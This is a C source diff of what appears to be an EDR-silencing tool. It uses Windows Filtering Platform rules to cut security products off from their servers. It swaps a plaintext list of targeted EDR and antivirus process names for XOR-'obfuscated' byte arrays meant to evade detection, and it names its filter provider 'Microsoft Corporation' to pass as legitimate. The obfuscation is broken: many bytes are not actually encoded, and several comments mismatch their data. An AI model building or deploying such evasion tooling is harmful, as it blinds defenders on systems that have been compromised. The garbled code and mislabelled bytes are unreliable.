@@ -1,458 +1,662 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <wchar.h>
+
+#include <winsock2.h>
+#include <windows.h>
+#include <fwpmu.h> // For Windows Filtering Platform
+
 #include "utils.h"
 
-char* edrProcess[] = {
-// Microsoft Defender for Endpoint and Microsoft Defender Antivirus
-    "MsMpEng.exe",
-    "MsSense.exe",
-    "SenseIR.exe",
-    "SenseNdr.exe",
-    "SenseCncProxy.exe",
-    "SenseSampleUploader.exe",
-// Elastic EDR
-	"winlogbeat.exe",
-    "elastic-agent.exe",
-    "elastic-endpoint.exe",
-    "filebeat.exe",
-// Trellix EDR
-    "xagt.exe",
-// Qualys EDR
-    "QualysAgent.exe",
-// SentinelOne
-    "SentinelAgent.exe",
-    "SentinelAgentWorker.exe",
-    "SentinelServiceHost.exe",
-    "SentinelStaticEngine.exe",  
-    "LogProcessorService.exe",
-    "SentinelStaticEngineScanner.exe",
-    "SentinelHelperService.exe",
-    "SentinelBrowserNativeHost.exe",
-// Cylance
-    "CylanceSvc.exe",
-// Cybereason
-    "AmSvc.exe",
-    "CrAmTray.exe",
-    "CrsSvc.exe",
-    "ExecutionPreventionSvc.exe",
-    "CybereasonAV.exe",
-// Carbon Black EDR
-    "cb.exe",
-// Carbon Black Cloud
-    "RepMgr.exe",
-    "RepUtils.exe",
-    "RepUx.exe",
-    "RepWAV.exe",
-    "RepWSC.exe",
-// Tanium
-    "TaniumClient.exe",
-    "TaniumCX.exe",
-    "TaniumDetectEngine.exe",
-// Palo Alto Networks Traps/Cortex XDR
-    "Traps.exe",
-    "cyserver.exe",
-    "CyveraService.exe",
-    "CyvrFsFlt.exe",
-// FortiEDR
-    "fortiedr.exe",
-// Cisco Secure Endpoint (Formerly Cisco AMP)
-    "sfc.exe",
-// ESET Inspect
-    "EIConnector.exe",
-    "ekrn.exe",
-// Harfanglab EDR
-    "hurukai.exe",
-//TrendMicro Apex One
-    "CETASvc.exe",
-    "WSCommunicator.exe",
-    "EndpointBasecamp.exe",
-    "TmListen.exe",
-    "Ntrtscan.exe",
-    "TmWSCSvc.exe",
-    "PccNTMon.exe",
-    "TMBMSRV.exe",
-    "CNTAoSMgr.exe",
-    "TmCCSF.exe"
+
+// Globally unique identifiers (GUIDs) for our WFP provider and sublayer
+const GUID ProviderGUID = { 0x4e27e7d4, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
+const GUID SubLayerGUID = { 0x4e27e7d5, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
+const wchar_t* ruleDescription = L"Blocks outbound connections for a specific EDR process";
+
+// Forward declarations
+BOOL getProcessFullPath(DWORD pid, WCHAR* fullPath, DWORD maxChars);
+
+
+// --- XOR Obfuscation Setup ---
+// A simple key for XORing the strings.
+const char XOR_KEY = 0x42;
+
+// Struct to hold the encrypted data and its size.
+struct EncryptedString {
+    const unsigned char* data;
+    size_t size;
 };
 
-// The "unblockall" feature will delete all filters that are based on the custom filter name
-WCHAR* filterName = L"Custom Outbound Filter";
-WCHAR* providerName = L"Microsoft Corporation";
-// provider description has to be unique because:
-// - avoid problem in adding persistent WFP filter to a provider (error 0x80320016)
-// - avoid removing legitimate WFP provider
-WCHAR* providerDescription = L"Microsoft Windows WFP Built-in custom provider.";
+// Forward declaration for decryptString
+char* decryptString(struct EncryptedString encStr);
 
-BOOL inWfpFlag[sizeof(edrProcess) / sizeof(edrProcess[0])] = { FALSE };
+// Function to decrypt a string at runtime.
+// IMPORTANT: The caller is responsible for freeing the returned char* with `free()`.
+char* decryptString(struct EncryptedString encStr) {
+    if (!encStr.data || encStr.size == 0) {
+        return NULL; // Use NULL in C, not nullptr
+    }
+    // Use malloc instead of new[]
+    char* decrypted = (char*)malloc(encStr.size + 1);
+    if (!decrypted) {
+        return NULL; // Check if malloc failed
+    }
+    for (size_t i = 0; i < encStr.size; ++i) {
+        decrypted[i] = encStr.data[i] ^ XOR_KEY;
+    }
+    decrypted[encStr.size] = '\0';
+    return decrypted;
+}
 
-// Check if the running process is our list
-BOOL isInEdrProcessList(const char* procName) {
-    for (int i = 0; i < sizeof(edrProcess) / sizeof(edrProcess[0]); i++) {
-        if (strcmp(procName, edrProcess[i]) == 0 && !inWfpFlag[i]) {
-            inWfpFlag[i] = TRUE;
+// --- Encrypted Process Names ---
+// Each process name is now an array of XORed bytes.
+
+const unsigned char data_0[] = { 0x2e, 0x73, 0x2e, 0x70, 0x25, 0x6e, 0x67, 0x2c, 0x65, 0x78, 0x65 }; // MsMpEng.exe
+const unsigned char data_1[] = { 0x2e, 0x73, 0x23, 0x65, 0x6e, 0x73, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // MsSense.exe
+const unsigned char data_2[] = { 0x23, 0x65, 0x6e, 0x73, 0x65, 0x2b, 0x32, 0x2c, 0x65, 0x78, 0x65 }; // senseCnc.exe
+const unsigned char data_3[] = { 0x23, 0x65, 0x6e, 0x73, 0x65, 0x2e, 0x64, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // sensedr.exe
+const unsigned char data_4[] = { 0x23, 0x65, 0x6e, 0x73, 0x65, 0x23, 0x6e, 0x63, 0x20, 0x72, 0x6f, 0x78, 0x79, 0x2c, 0x65, 0x78, 0x65 }; // senseCncProxy.exe
+const unsigned char data_5[] = { 0x23, 0x65, 0x6e, 0x73, 0x65, 0x23, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x35, 0x70, 0x6c, 0x6f, 0x61, 0x64, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // senseSampleUploader.exe
+const unsigned char data_6[] = { 0x2a, 0x65, 0x61, 0x6c, 0x74, 0x68, 0x23, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // HealthService.exe
+const unsigned char data_7[] = { 0x2e, 0x6f, 0x6e, 0x69, 0x74, 0x6f, 0x72, 0x69, 0x6e, 0x67, 0x2a, 0x6f, 0x73, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // MonitoringHost.exe
+const unsigned char data_8[] = { 0x2e, 0x70, 0x23, 0x6d, 0x64, 0x32, 0x75, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // MpCmdRun.exe
+const unsigned char data_9[] = { 0x77, 0x69, 0x6e, 0x6c, 0x6f, 0x67, 0x62, 0x65, 0x61, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // winlogbeat.exe
+const unsigned char data_10[] = { 0x65, 0x6c, 0x61, 0x73, 0x74, 0x69, 0x63, 0x2d, 0x61, 0x67, 0x65, 0x6e, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // elastic-agent.exe
+const unsigned char data_11[] = { 0x65, 0x6c, 0x61, 0x73, 0x74, 0x69, 0x63, 0x2d, 0x65, 0x6e, 0x64, 0x70, 0x6f, 0x69, 0x6e, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // elastic-endpoint.exe
+const unsigned char data_12[] = { 0x66, 0x69, 0x6c, 0x65, 0x62, 0x65, 0x61, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // filebeat.exe
+const unsigned char data_13[] = { 0x78, 0x61, 0x67, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // xagt.exe
+const unsigned char data_14[] = { 0x31, 0x75, 0x61, 0x6c, 0x79, 0x73, 0x21, 0x67, 0x65, 0x6e, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // QualysAgent.exe
+const unsigned char data_15[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x21, 0x67, 0x65, 0x6e, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // SentinelAgent.exe
+const unsigned char data_16[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x21, 0x67, 0x65, 0x6e, 0x74, 0x37, 0x6f, 0x72, 0x6b, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // SentinelAgentWorker.exe
+const unsigned char data_17[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x23, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2a, 0x6f, 0x73, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // SentinelServiceHost.exe
+const unsigned char data_18[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x23, 0x74, 0x61, 0x74, 0x69, 0x63, 0x25, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // SentinelStaticEngine.exe
+const unsigned char data_19[] = { 0x2c, 0x6f, 0x67, 0x20, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x6f, 0x72, 0x23, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // LogProcessorService.exe
+const unsigned char data_20[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x23, 0x74, 0x61, 0x74, 0x69, 0x63, 0x25, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x23, 0x63, 0x61, 0x6e, 0x6e, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // SentinelStaticEngineScanner.exe
+const unsigned char data_21[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x2a, 0x65, 0x6c, 0x70, 0x65, 0x72, 0x23, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // SentinelHelperService.exe
+const unsigned char data_22[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x22, 0x72, 0x6f, 0x77, 0x73, 0x65, 0x72, 0x2e, 0x61, 0x74, 0x69, 0x76, 0x65, 0x2a, 0x6f, 0x73, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // SentinelBrowserNativeHost.exe
+const unsigned char data_23[] = { 0x2c, 0x6f, 0x67, 0x23, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // LogCollector.exe
+const unsigned char data_24[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x2e, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x23, 0x63, 0x61, 0x6e, 0x6e, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // SentinelMemoryScanner.exe
+const unsigned char data_25[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x32, 0x61, 0x6e, 0x67, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // SentinelRanger.exe
+const unsigned char data_26[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x32, 0x65, 0x6d, 0x65, 0x64, 0x69, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // SentinelRemediation.exe
+const unsigned char data_27[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x32, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x23, 0x68, 0x65, 0x6c, 0x6c, 0x2a, 0x6f, 0x73, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // SentinelRemoteShellHost.exe
+const unsigned char data_28[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x23, 0x63, 0x61, 0x6e, 0x26, 0x72, 0x6f, 0x6d, 0x23, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x2e, 0x65, 0x6e, 0x75, 0x2c, 0x65, 0x78, 0x65 }; // SentinelScanFromContextMenu.exe
+const unsigned char data_29[] = { 0x23, 0x65, 0x6e, 0x74, 0x69, 0x6e, 0x65, 0x6c, 0x35, 0x2b, 0x2c, 0x65, 0x78, 0x65 }; // SentinelUI.exe
+const unsigned char data_30[] = { 0x23, 0x79, 0x6c, 0x61, 0x6e, 0x63, 0x65, 0x23, 0x76, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // CylanceSvc.exe
+const unsigned char data_31[] = { 0x21, 0x6d, 0x23, 0x76, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // AMPSvc.exe
+const unsigned char data_32[] = { 0x23, 0x72, 0x21, 0x6d, 0x34, 0x72, 0x61, 0x79, 0x2c, 0x65, 0x78, 0x65 }; // csagent.exe
+const unsigned char data_33[] = { 0x23, 0x72, 0x73, 0x23, 0x76, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // cssauth.exe
+const unsigned char data_34[] = { 0x25, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x72, 0x65, 0x76, 0x65, 0x6e, 0x74, 0x69, 0x6f, 0x6e, 0x23, 0x76, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // ExecutionPreventionSvc.exe
+const unsigned char data_35[] = { 0x23, 0x79, 0x62, 0x65, 0x72, 0x65, 0x61, 0x73, 0x6f, 0x6e, 0x21, 0x36, 0x2c, 0x65, 0x78, 0x65 }; // CybereasonA6.exe
+const unsigned char data_36[] = { 0x63, 0x62, 0x2c, 0x65, 0x78, 0x65 }; // cb.exe
+const unsigned char data_37[] = { 0x32, 0x65, 0x70, 0x2e, 0x67, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // RepMgr.exe
+const unsigned char data_38[] = { 0x32, 0x65, 0x70, 0x35, 0x74, 0x69, 0x6c, 0x73, 0x2c, 0x65, 0x78, 0x65 }; // RepUtils.exe
+const unsigned char data_39[] = { 0x32, 0x65, 0x70, 0x35, 0x78, 0x2c, 0x65, 0x78, 0x65 }; // RepUx.exe
+const unsigned char data_40[] = { 0x32, 0x65, 0x70, 0x37, 0x21, 0x36, 0x2c, 0x65, 0x78, 0x65 }; // RepWSC.exe
+const unsigned char data_41[] = { 0x32, 0x65, 0x70, 0x37, 0x23, 0x23, 0x2c, 0x65, 0x78, 0x65 }; // RepSVC.exe
+const unsigned char data_42[] = { 0x34, 0x61, 0x6e, 0x69, 0x75, 0x6d, 0x23, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // TaniumClient.exe
+const unsigned char data_43[] = { 0x34, 0x61, 0x6e, 0x69, 0x75, 0x6d, 0x23, 0x38, 0x2c, 0x65, 0x78, 0x65 }; // TaniumCX.exe
+const unsigned char data_44[] = { 0x34, 0x61, 0x6e, 0x69, 0x75, 0x6d, 0x24, 0x65, 0x74, 0x65, 0x63, 0x74, 0x25, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // TaniumDetectEngine.exe
+const unsigned char data_45[] = { 0x34, 0x72, 0x61, 0x70, 0x73, 0x2c, 0x65, 0x78, 0x65 }; // Traps.exe
+const unsigned char data_46[] = { 0x63, 0x79, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // cyserver.exe
+const unsigned char data_47[] = { 0x23, 0x79, 0x76, 0x65, 0x72, 0x61, 0x23, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // cyveraService.exe
+const unsigned char data_48[] = { 0x23, 0x79, 0x76, 0x72, 0x26, 0x73, 0x26, 0x6c, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // cyvrfsflt.exe
+const unsigned char data_49[] = { 0x66, 0x6f, 0x72, 0x74, 0x69, 0x65, 0x64, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // fortiedr.exe
+const unsigned char data_50[] = { 0x73, 0x66, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // sfc.exe
+const unsigned char data_51[] = { 0x25, 0x2b, 0x23, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // ESConnector.exe
+const unsigned char data_52[] = { 0x65, 0x6b, 0x72, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // ekrn.exe
+const unsigned char data_53[] = { 0x68, 0x75, 0x72, 0x75, 0x6b, 0x61, 0x69, 0x2c, 0x65, 0x78, 0x65 }; // hurukai.exe
+const unsigned char data_54[] = { 0x65, 0x6e, 0x64, 0x67, 0x61, 0x6d, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // endgame.exe
+const unsigned char data_55[] = { 0x23, 0x25, 0x34, 0x21, 0x23, 0x76, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // CSTAClt.exe
+const unsigned char data_56[] = { 0x37, 0x23, 0x23, 0x6f, 0x6d, 0x6d, 0x75, 0x6e, 0x69, 0x63, 0x61, 0x74, 0x6f, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // wccommunicator.exe
+const unsigned char data_57[] = { 0x25, 0x6e, 0x64, 0x70, 0x6f, 0x69, 0x6e, 0x74, 0x22, 0x61, 0x73, 0x65, 0x63, 0x61, 0x6d, 0x70, 0x2c, 0x65, 0x78, 0x65 }; // EndpointBasecamp.exe
+const unsigned char data_58[] = { 0x34, 0x6d, 0x2c, 0x69, 0x73, 0x74, 0x65, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // TmListen.exe
+const unsigned char data_59[] = { 0x2e, 0x74, 0x72, 0x74, 0x73, 0x63, 0x61, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // Ntrtscan.exe
+const unsigned char data_60[] = { 0x34, 0x6d, 0x37, 0x23, 0x23, 0x23, 0x76, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // TmPfwSvc.exe
+const unsigned char data_61[] = { 0x20, 0x63, 0x63, 0x2e, 0x34, 0x2e, 0x6f, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // AcCnTmon.exe
+const unsigned char data_62[] = { 0x34, 0x2d, 0x22, 0x2e, 0x23, 0x32, 0x36, 0x2c, 0x65, 0x78, 0x65 }; // TMBMSRV.exe
+const unsigned char data_63[] = { 0x23, 0x2e, 0x34, 0x21, 0x6f, 0x23, 0x2e, 0x67, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // SmTloSmgr.exe
+const unsigned char data_64[] = { 0x34, 0x6d, 0x23, 0x23, 0x23, 0x26, 0x2c, 0x65, 0x78, 0x65 }; // TmSvc.exe
+const unsigned char data_65[] = { 0x77, 0x73, 0x63, 0x74, 0x72, 0x6c, 0x73, 0x76, 0x63, 0x2c, 0x65, 0x78, 0x65 }; // wsctrlsvc.exe
+const unsigned char data_66[] = { 0x2a, 0x69, 0x70, 0x73, 0x34, 0x72, 0x61, 0x79, 0x2c, 0x65, 0x78, 0x65 }; // hips4ray.exe
+const unsigned char data_67[] = { 0x2a, 0x69, 0x70, 0x73, 0x24, 0x61, 0x65, 0x6d, 0x6f, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // hipsdaemon.exe
+const unsigned char data_68[] = { 0x68, 0x69, 0x70, 0x73, 0x74, 0x72, 0x61, 0x79, 0x2c, 0x65, 0x78, 0x65 }; // hipstray.exe
+const unsigned char data_69[] = { 0x77, 0x73, 0x63, 0x74, 0x72, 0x6c, 0x2c, 0x65, 0x78, 0x65 }; // wsctrl.exe
+const unsigned char data_70[] = { 0x75, 0x73, 0x79, 0x73, 0x64, 0x69, 0x61, 0x67, 0x2c, 0x65, 0x78, 0x65 }; // usysdiag.exe
+const unsigned char data_71[] = { 0x1d, 0x1e, 0x1c, 0x21, 0x2b, 0x2c, 0x65, 0x78, 0x65 }; // AVKProxy.exe
+const unsigned char data_72[] = { 0x1d, 0x1e, 0x1c, 0x61, 0x70, 0x70, 0x6c, 0x6f, 0x61, 0x64, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // AVKApploader.exe
+const unsigned char data_73[] = { 0x1d, 0x1e, 0x1c, 0x22, 0x6f, 0x78, 0x2c, 0x64, 0x1e, 0x1c, 0x2c, 0x65, 0x78, 0x65 }; // AVKWCtl.exe
+const unsigned char data_74[] = { 0x1d, 0x1e, 0x1c, 0x62, 0x6f, 0x78, 0x6d, 0x61, 0x69, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // AVKBoxMain.exe
+const unsigned char data_75[] = { 0x1d, 0x1e, 0x1c, 0x24, 0x65, 0x73, 0x6b, 0x21, 0x6e, 0x61, 0x2c, 0x65, 0x78, 0x65 }; // AVKScan.exe
+const unsigned char data_76[] = { 0x1d, 0x1e, 0x1c, 0x24, 0x65, 0x73, 0x6b, 0x21, 0x6e, 0x61, 0x1e, 0x1c, 0x2c, 0x65, 0x78, 0x65 }; // AVKScanSvc.exe
+const unsigned char data_77[] = { 0x1d, 0x1e, 0x1c, 0x24, 0x69, 0x61, 0x67, 0x6e, 0x6f, 0x73, 0x65, 0x23, 0x63, 0x61, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // AVKDiagnoseScan.exe
+const unsigned char data_78[] = { 0x1d, 0x1e, 0x1c, 0x66, 0x61, 0x62, 0x2c, 0x65, 0x78, 0x65 }; // AVKFab.exe
+const unsigned char data_79[] = { 0x1d, 0x1e, 0x1c, 0x26, 0x65, 0x65, 0x64, 0x62, 0x61, 0x63, 0x6b, 0x2c, 0x65, 0x78, 0x65 }; // AVKFeedback.exe
+const unsigned char data_80[] = { 0x1d, 0x1e, 0x1c, 0x26, 0x69, 0x6c, 0x65, 0x27, 0x75, 0x61, 0x72, 0x64, 0x2c, 0x65, 0x78, 0x65 }; // AVKFileGuard.exe
+const unsigned char data_81[] = { 0x1d, 0x1e, 0x1c, 0x2a, 0x2b, 0x6d, 0x6d, 0x75, 0x2c, 0x65, 0x78, 0x65 }; // AVKPLUMM.exe
+const unsigned char data_82[] = { 0x1d, 0x1e, 0x1c, 0x68, 0x69, 0x70, 0x73, 0x2c, 0x65, 0x78, 0x65 }; // AVKHips.exe
+const unsigned char data_83[] = { 0x1d, 0x1e, 0x1c, 0x68, 0x6f, 0x74, 0x66, 0x69, 0x78, 0x2c, 0x65, 0x78, 0x65 }; // AVKHotfix.exe
+const unsigned char data_84[] = { 0x1d, 0x1e, 0x1c, 0x2b, 0x6e, 0x73, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // AVKInst.exe
+const unsigned char data_85[] = { 0x1d, 0x1e, 0x1c, 0x2c, 0x6f, 0x67, 0x23, 0x65, 0x6e, 0x74, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // AVKLogCenter.exe
+const unsigned char data_86[] = { 0x1d, 0x1e, 0x1c, 0x2e, 0x73, 0x67, 0x23, 0x65, 0x6e, 0x74, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // AVKMsgCenter.exe
+const unsigned char data_87[] = { 0x1d, 0x1e, 0x1c, 0x6e, 0x65, 0x74, 0x63, 0x66, 0x67, 0x2c, 0x65, 0x78, 0x65 }; // AVKNetcfg.exe
+const unsigned char data_88[] = { 0x1d, 0x1e, 0x1c, 0x6e, 0x65, 0x74, 0x63, 0x66, 0x67, 0x1e, 0x1c, 0x2c, 0x65, 0x78, 0x65 }; // AVKNetcfgSvc.exe
+const unsigned char data_89[] = { 0x1d, 0x1e, 0x1c, 0x6e, 0x65, 0x74, 0x6d, 0x61, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // AVKNetman.exe
+const unsigned char data_90[] = { 0x1d, 0x1e, 0x1c, 0x2e, 0x65, 0x74, 0x32, 0x65, 0x70, 0x61, 0x69, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // AVKNetRepair.exe
+const unsigned char data_91[] = { 0x1d, 0x1e, 0x1c, 0x20, 0x61, 0x74, 0x63, 0x68, 0x2e, 0x67, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // AVKPatchMgr.exe
+const unsigned char data_92[] = { 0x1d, 0x1e, 0x1c, 0x20, 0x61, 0x74, 0x63, 0x68, 0x2e, 0x67, 0x72, 0x1e, 0x1c, 0x2c, 0x65, 0x78, 0x65 }; // AVKPatchMgrSvc.exe
+const unsigned char data_93[] = { 0x1d, 0x1e, 0x1c, 0x20, 0x61, 0x79, 0x2b, 0x6e, 0x73, 0x75, 0x72, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // AVKPayEnsure.exe
+const unsigned char data_94[] = { 0x1d, 0x1e, 0x1c, 0x31, 0x61, 0x6e, 0x64, 0x21, 0x25, 0x78, 0x70, 0x65, 0x72, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // AVQRandExpert.exe
+const unsigned char data_95[] = { 0x1d, 0x1e, 0x1c, 0x31, 0x2e, 0x61, 0x63, 0x68, 0x69, 0x6e, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // AVQRMachine.exe
+const unsigned char data_96[] = { 0x1d, 0x1e, 0x1c, 0x72, 0x65, 0x61, 0x6c, 0x70, 0x72, 0x6f, 0x2c, 0x65, 0x78, 0x65 }; // AVKRealpro.exe
+const unsigned char data_97[] = { 0x1d, 0x1e, 0x1c, 0x32, 0x65, 0x73, 0x74, 0x6f, 0x72, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // AVKRestore.exe
+const unsigned char data_98[] = { 0x1d, 0x1e, 0x1c, 0x72, 0x70, 0x2c, 0x65, 0x78, 0x65 }; // AVKrp.exe
+const unsigned char data_99[] = { 0x1d, 0x1e, 0x1c, 0x72, 0x70, 0x73, 0x2c, 0x65, 0x78, 0x65 }; // AVKrps.exe
+const unsigned char data_100[] = { 0x1d, 0x1e, 0x1c, 0x23, 0x61, 0x66, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // AVKSafe.exe
+const unsigned char data_101[] = { 0x1d, 0x1e, 0x1c, 0x73, 0x63, 0x6c, 0x6f, 0x67, 0x2c, 0x65, 0x78, 0x65 }; // AVKsclog.exe
+const unsigned char data_102[] = { 0x1d, 0x1e, 0x1c, 0x23, 0x63, 0x72, 0x65, 0x65, 0x6e, 0x23, 0x61, 0x70, 0x74, 0x75, 0x72, 0x65, 0x2c, 0x65, 0x78, 0x65 }; // AVKScreenCapture.exe
+const unsigned char data_103[] = { 0x1d, 0x1e, 0x1c, 0x73, 0x63, 0x74, 0x62, 0x6c, 0x69, 0x73, 0x74, 0x2c, 0x65, 0x78, 0x65 }; // AVKsctblist.exe
+const unsigned char data_104[] = { 0x1d, 0x1e, 0x1c, 0x73, 0x64, 0x2c, 0x65, 0x78, 0x65 }; // AVKsd.exe
+const unsigned char data_105[] = { 0x1d, 0x1e, 0x1c, 0x73, 0x64, 0x72, 0x75, 0x6e, 0x2c, 0x65, 0x78, 0x65 }; // AVKsdrun.exe
+const unsigned char data_106[] = { 0x1d, 0x1e, 0x1c, 0x73, 0x64, 0x23, 0x65, 0x74, 0x75, 0x70, 0x2c, 0x65, 0x78, 0x65 }; // AVKsdSetup.exe
+const unsigned char data_107[] = { 0x1d, 0x1e, 0x1c, 0x73, 0x64, 0x34, 0x6f, 0x61, 0x73, 0x74, 0x73, 0x2c, 0x65, 0x78, 0x65 }; // AVKsdToasts.exe
+const unsigned char data_108[] = { 0x1d, 0x1e, 0x1c, 0x73, 0x64, 0x75, 0x70, 0x64, 0x2c, 0x65, 0x78, 0x65 }; // AVKsupd.exe
+const unsigned char data_109[] = { 0x1d, 0x1e, 0x1c, 0x23, 0x65, 0x74, 0x74, 0x69, 0x6e, 0x67, 0x23, 0x65, 0x6e, 0x74, 0x65, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // AVKSettingCenter.exe
+const unsigned char data_110[] = { 0x1d, 0x1e, 0x1c, 0x23, 0x68, 0x65, 0x6c, 0x6c, 0x20, 0x72, 0x6f, 0x2c, 0x65, 0x78, 0x65 }; // AVKShellPro.exe
+const unsigned char data_111[] = { 0x1d, 0x1e, 0x1c, 0x73, 0x6b, 0x69, 0x6e, 0x69, 0x6e, 0x73, 0x74, 0x61, 0x6c, 0x6c, 0x2c, 0x65, 0x78, 0x65 }; // AVKskininstall.exe
+const unsigned char data_112[] = { 0x1d, 0x1e, 0x1c, 0x23, 0x6b, 0x69, 0x6e, 0x2e, 0x67, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // AVKsmgr.exe
+const unsigned char data_113[] = { 0x1d, 0x1e, 0x1c, 0x23, 0x20, 0x34, 0x6f, 0x6f, 0x6c, 0x2c, 0x65, 0x78, 0x65 }; // AVKSTool.exe
+const unsigned char data_114[] = { 0x1d, 0x1e, 0x1c, 0x74, 0x61, 0x73, 0x6b, 0x6d, 0x67, 0x72, 0x2c, 0x65, 0x78, 0x65 }; // AVKtaskmgr.exe
+const unsigned char data_115[] = { 0x1d, 0x1e, 0x1c, 0x34, 0x6f, 0x61, 0x73, 0x74, 0x73, 0x2c, 0x65, 0x78, 0x65 }; // AVKToasts.exe
+const unsigned char data_116[] = { 0x1d, 0x1e, 0x1c, 0x74, 0x72, 0x61, 0x79, 0x2c, 0x65, 0x78, 0x65 }; // AVKtray.exe
+const unsigned char data_117[] = { 0x1d, 0x1e, 0x1c, 0x35, 0x24, 0x69, 0x73, 0x6b, 0x23, 0x68, 0x65, 0x63, 0x6b, 0x2c, 0x65, 0x78, 0x65 }; // AVKVDiskCheck.exe
+const unsigned char data_118[] = { 0x1d, 0x1e, 0x1c, 0x35, 0x24, 0x69, 0x73, 0x6b, 0x27, 0x75, 0x61, 0x72, 0x64, 0x2c, 0x65, 0x78, 0x65 }; // AVKVDiskGuard.exe
